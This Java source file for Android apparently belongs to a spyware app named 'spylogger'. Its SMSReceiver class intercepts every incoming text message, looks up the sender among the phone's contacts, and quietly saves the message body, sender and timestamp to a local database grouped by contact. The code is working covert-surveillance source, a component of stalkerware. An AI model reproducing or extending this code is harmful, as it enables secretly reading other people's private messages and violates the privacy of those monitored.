package com.gravatasufoca.spylogger.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.model.TipoMensagem;
import com.gravatasufoca.spylogger.model.TipoMidia;
import com.gravatasufoca.spylogger.model.Topico;
import com.gravatasufoca.spylogger.repositorio.RepositorioMensagem;
import com.gravatasufoca.spylogger.repositorio.RepositorioTopico;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioMensagemImpl;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioTopicoImpl;
import com.gravatasufoca.spylogger.utils.Utils;

import java.sql.SQLException;
import java.util.Date;


public class SMSReceiver extends BroadcastReceiver {

	public void onReceive(Context context, Intent intent) {

        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
			try {
				RepositorioMensagem repositorioMensagem = new RepositorioMensagemImpl(context);
				RepositorioTopico repositorioTopico = new RepositorioTopicoImpl(context);
				// Retrieves a map of extended data from the intent.
				final Bundle bundle = intent.getExtras();

				try {

					if (bundle != null) {

						final Object[] pdusObj = (Object[]) bundle.get("pdus");

						for (int i = 0; i < pdusObj.length; i++) {

							SmsMessage currentMessage = SmsMessage
									.createFromPdu((byte[]) pdusObj[i]);
							String phoneNumber = currentMessage
									.getDisplayOriginatingAddress();

							String message = currentMessage.getDisplayMessageBody();
							String name = Utils.getContactDisplayNameByNumber(phoneNumber, context.getContentResolver());
							Date data = new Date(
									currentMessage.getTimestampMillis());

							Mensagem mensagem = new Mensagem.MensagemBuilder()
									.setTexto(message)
									.setData(data)
									.setContato(name)
									.setRemetente(true)
									.setTipoMidia(TipoMidia.TEXTO)
									.setDataRecebida(new Date())
									.setIdReferencia(name).build();


							Topico topico=repositorioTopico.porNome(mensagem.getContato());
							if(topico==null){
								topico=new Topico.TopicoBuilder()
										.setNome(mensagem.getContato())
										.setIdReferencia(mensagem.getIdReferencia())
										.setGrupo(false)
										.build(TipoMensagem.SMS);

								repositorioTopico.inserir(topico);
							}
							mensagem.setTopico(topico);
							repositorioMensagem.inserir(mensagem);

						} // end for loop
					} // bundle is null

				} catch (Exception e) {
					Log.e("SmsReceiver", "Exception smsReceiver" + e);

				}
			} catch (SQLException e1) {
			}
        }
	}
}